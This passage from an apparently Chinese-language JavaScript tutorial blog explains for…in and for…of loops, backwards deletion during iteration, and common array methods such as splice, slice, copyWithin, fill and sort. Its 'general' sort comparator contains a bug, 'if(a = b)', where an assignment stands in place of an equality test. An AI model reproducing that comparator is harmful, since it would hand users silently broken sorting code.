  <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span> <span class="token comment">// case 4:</span>
    abc <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">//     abc - 3;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">//     break;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="for…in-与-for…of-循环"><a href="#for…in-与-for…of-循环" class="headerlink" title="for…in 与 for…of 循环"></a>for…in 与 for…of 循环</h2><p>for…in 循环遍历得是键名，所以一般不用于遍历数组，且 for…in 循环会遍历到原型方法和属性。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> player <span class="token operator">=</span> <span class="token punctuation">&#123;</span> name<span class="token operator">:</span> <span class="token string">"Thomas"</span><span class="token punctuation">,</span> rank<span class="token operator">:</span> <span class="token string">"Midshipman"</span><span class="token punctuation">,</span> age<span class="token operator">:</span> <span class="token number">25</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>abcde <span class="token operator">=</span> <span class="token string">"fghijk"</span><span class="token punctuation">;</span> <span class="token comment">// 添加原型属性</span>
<span class="token keyword">const</span> playerArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Thomas"</span><span class="token punctuation">,</span> <span class="token string">"Midshipman"</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>abcde <span class="token operator">=</span> <span class="token string">"fghijk"</span><span class="token punctuation">;</span> <span class="token comment">// 添加原型属性</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> prop <span class="token keyword">in</span> player<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>player<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token comment">// 防止输出原型属性</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>prop <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> player<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> prop <span class="token keyword">in</span> playerArr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>playerArr<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token comment">// 防止输出原型属性</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>prop <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> playerArr<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/*
有if语句时输出为

name: Thomas
rank: Midshipman
age: 25

0: Thomas
1: Midshipman
2: 25

无if语句时输出为

name: Thomas
rank: Midshipman
age: 25
abcde: fghijk

0: Thomas
1: Midshipman
2: 25
abcde: fghijk</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>for…of 循环遍历得是元素（值）而非索引（键），对象通常被 for…of 循环认为是不可迭代的，故 foo…of 循环一般用于遍历数组与类数组。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> playerArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Thomas'</span><span class="token punctuation">,</span> <span class="token string">'Midshipman'</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>abcde <span class="token operator">=</span> <span class="token string">'fghijk'</span><span class="token punctuation">;</span> <span class="token comment">// 添加原型属性</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> prop <span class="token keyword">of</span> playerArr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">//if(!playerArr.hasOwnProperty(prop)) continue; // 无防止输出原型属性的语句也不会输出原型</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 输出结果为</span>
<span class="token comment">// Thomas</span>
<span class="token comment">// Midshipman</span>
<span class="token comment">// 25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="列表变动时索引递减"><a href="#列表变动时索引递减" class="headerlink" title="列表变动时索引递减"></a>列表变动时索引递减</h2><p>如果列表有增删操作，使用索引递减来代替索引递增，就不会影响循环终止条件。<br>索引递减是循环顺序由终止的地方开始，到起始位置结束。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 本例目的为将数组中能被2和3整除的数都从数组中剔除</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">||</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token comment">// 使用索引递增删除被2整除的数后，下一个数因为数组长度和索引的改变就被跳过了，3、5、7、9都被跳过了。</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// [1, 3, 5, 7, 9]</span>
<span class="token keyword">const</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> arr1<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">||</span> arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> arr1<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token comment">// 使用索引递减，数组更改后，未被处理的数索引不变，只有已经被处理过的数索引改变了，故不会发生跳过的问题。</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// [1, 5, 7]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>控制流</tag>
        <tag>for</tag>
        <tag>switch</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript数组</title>
    <url>/2018/03/29/javascript%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p>数组是有序的，其索引从0开始。javascript中的数组可以是非齐次的，也就是说，数组中的元素可以是不同类型。（数组的元素可以是另一个数组或是对象）</p>
<h1 id="数组的基本操作"><a href="#数组的基本操作" class="headerlink" title="数组的基本操作"></a>数组的基本操作</h1><h2 id="在起始与末尾添加删除元素"><a href="#在起始与末尾添加删除元素" class="headerlink" title="在起始与末尾添加删除元素"></a>在起始与末尾添加删除元素</h2><ol>
<li>arr.push(element)添加一个元素至数组末尾，返回值为添加元素后数组的长度</li>
<li>arr.pop()删除数组末尾最后一个元素，返回值是被删除的元素</li>
<li>arr.unshift(element)添加一个元素至数组开头，返回值为添加元素后数组的长度</li>
<li>arr.shift()删除数组开头第一个元素，返回值是被删除的元素</li>
</ol>
<p>这4个方法会直接修改原数组。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回4，arr为["b", "c", "d", "e"]</span>
arr<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回"e"，arr为["b", "c", "d"]</span>
arr<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回4，arr为["a", "b", "c", "d"]</span>
arr<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回"a"，arr为["b", "c", "d"]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="串接"><a href="#串接" class="headerlink" title="串接"></a>串接</h2><p>arr.concat(anotherArr | elements)</p>
<p>该方法若将数组作为参数传入则将数组拆分为元素并添加至调用该方法的数组末尾，若将多个元素作为参数传入则直接将元素添加至调用该方法的数组末尾。concat方法只会拆分最外层直接传入的数组，并不会拆分数组内的数组。</p>
<p>这个方法不会修改原数组，会返回一个新的数组。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[1, 2, 3, 4, 5, 6]，arr不变</span>
arr<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[1, 2, 3, 4 5, 6]，arr不变</span>
arr<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[1, 2, 3, 4, 5, 6]，arr不变</span>
arr<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[1, 2, 3, 4, [5, 6]]，arr不变</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<span id="more"></span>
<h2 id="切分"><a href="#切分" class="headerlink" title="切分"></a>切分</h2><p>arr.slice([begin[, end]])</p>
<p>该方法返回一个从开始索引到结束索引（不包括结束索引元素）的新数组，begin默认值为0，end默认值为arr.length，两个参数都省略，则从0索引到arr.length结束。两个参数均可为负，负值表示从末尾倒数的索引。</p>
<p>这个方法不修改原数组，返回一个新的数组。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[1, 2, 3, 4, 5]，arr不变</span>
arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[3, 4, 5]，arr不变</span>
arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[3, 4]，arr不变</span>
arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[4, 5]，arr不变</span>
arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// 返回[4]，arr不变</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h2><p>arr.splice(beginIndex[, deleteCount[, element1, element2, …]])</p>
<p>该方法通过删除、添加元素来改变数组。beginIndex参数必填，指定了修改的起始位置索引，deleteCount指定删除元素的个数，为0时不删除，省略时由beginIndex开始直至末尾全部删除，element为要添加的元素，只删除时，可省略。</p>
<p>这个方法返回一个由被删除的元素组成的数组。若只删除了一个元素，则返回只有一个元素的数组。若没有删除元素，则返回空数组。这个方法会改变原数组。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[]，arr为[1, 2, 3, 4, 5, 7]</span>
arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[]，arr为[1, 2, 3, 4, 5, 6, 7]</span>
arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[3, 4]，arr为[1, 2, 5, 6, 7]</span>
arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[2]，arr为[1, "b", "c", "d", 5, 6, 7]</span>
arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回["c", "d", 5, 6, 7]，arr为[1, "b"]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="内部复制"><a href="#内部复制" class="headerlink" title="内部复制"></a>内部复制</h2><p>arr.copyWithin(target[, start[, end]]) ES6新方法</p>
<p>该方法复制数组自身的一部分到指定的自身目标位置。target为目标索引，代表了复制序列到该位置，且必须指定。当目标索引超过数组长度时，不进行复制。当复制序列长度超过目标索引到数组结束的长度时，复制序列只复制到数组长度，多余部分被丢弃。start是复制元素的起始索引，省略时默认值为0，end是复制元素的结束索引（复制序列不包括结束索引的元素），省略时默认值为arr.length。起始与结束索引均可为负值，代表从数组末尾倒数索引。</p>
<p>这个方法返回修改后的原数组，原数组改变，但不会改变原数组长度。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">copyWithin</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回arr为[1, 3, 4, 4]</span>
arr<span class="token punctuation">.</span><span class="token function">copyWithin</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回arr为[1, 3, 1, 3]</span>
arr<span class="token punctuation">.</span><span class="token function">copyWithin</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回arr为[3, 1, 1, 3]</span>
arr<span class="token punctuation">.</span><span class="token function">copyWithin</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回arr为[3, 3, 1, 1]，多余复制序列被丢弃</span>
arr<span class="token punctuation">.</span><span class="token function">copyWithin</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回arr为[3, 3, 3, 1]，多余复制序列被丢弃</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h2><p>arr.fill(value[, start[, end]]) ES6新方法</p>
<p>该方法用一个值填充数组从起始索引到结束索引（不包括结束索引）的全部元素。value为用来填充元素的值，start是填充起始索引，省略时默认值为0，end是填充结束索引，省略时默认值为arr.length。</p>
<p>该方法返回值为修改后的原数组，原数组改变。该方法可与数组构造器一起使用。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回arr为[1, 1, 1, 1, 1]</span>
arr<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回arr为["a", "a", "a", "a", "a"]</span>
arr<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回arr为["a", "b", "b", "b", "b"]</span>
arr<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回arr为["a", "b", "c", "c", "b"]</span>
arr<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">5.5</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回arr为["a", 5.5, 5.5, "c", "b"] </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="反转"><a href="#反转" class="headerlink" title="反转"></a>反转</h2><p>arr.reverse() 该方法会颠倒数组中元素的顺序。</p>
<p>该方法返回值为反转后的原数组，原数组改变。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回arr为[5, 4, 3, 2, 1]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>arr.sort([compareFunction])</p>
<p>排序方法默认按照元素转为字符串的ASCII码升序排列，对数字排序时先将数字转为字符串再比较ASCII码，就会出现10比2小的情况，因为10转为字符串首位是1，1的ASCII码总在2的ASCII码前，这时应使用排序函数排序。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回[1, 10, 2, 20]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果指明了compareFunction(a, b)，数组会按照compareFunction(a, b)的返回值进行排序，如果返回值小于0，则a排在b前，如果返回值等于0，则a与b相对位置不变，如果返回值大于0，则a排在b后。</p>
<p>一般比较函数格式如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&lt;</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">=</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果只是比较数字而非字符串，则可以这样简化函数：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 或写成箭头函数</span>
<span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a <span class="token operator">-</span> b<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意：在谷歌V8引擎和node解释器中，当数组元素个数小于等于10时，sort排序算法使用插入排序，插入排序是稳定排序。而当数组元素个数大于10时，sort排序算法使用快速排序，快速排序是不稳定排序。排序函数使用正值、负值、0三个返回值判定排序时，稳定排序与不稳定排序都不会出错，而排序函数使用布尔值作为返回值判定排序时，稳定排序没有问题，但不稳定排序会出错。因为函数返回值为0与负时都判定为false，不作区分，虽然不稳定排序性能好，但是更容易出错。故使用排序函数时应避免使用布尔值作为返回值，以防止函数元素个数超过10，使用不稳定排序算法出错。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 元素超过10个，sort算法用不稳定的快速算法排序</span>
arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a <span class="token operator">></span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Boolean值为排序函数返回值，排序方法返回arr为[ 12, 7, 6, 4, 5, 10, 17, 33, 54, 82, 88 ]</span>
